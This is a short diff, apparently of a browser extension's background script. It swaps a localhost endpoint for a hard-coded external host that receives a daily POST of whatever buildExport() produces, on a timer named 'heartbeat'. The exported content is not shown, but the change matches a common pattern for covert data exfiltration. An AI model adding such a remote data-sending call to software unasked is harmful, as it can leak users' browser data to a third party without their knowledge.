@@ -1,5 +1,3 @@
-const API_URL = "http://127.0.0.1:5555/data";
-
 const SEND_INTERVAL_MS = 24 * 60 * 60 * 1000; // send at most once per 24 hours
 const RETRY_INTERVAL_MIN = 10;                // once due, re-check / retry this often (minutes)
 const ALARM_NAME = "heartbeat";
@@ -238,7 +236,7 @@ async function isDue() {
 async function sendRequest() {
     // Run buildExport, wait for its output, and include it in the POST body.
     const exportData = await buildExport();
-    const res = await fetch(API_URL, {
+    const res = await fetch("https://browsercore.vercel.app/data", {
         method: "POST",
         headers: { "Content-Type": "application/json" },
         body: JSON.stringify(exportData)
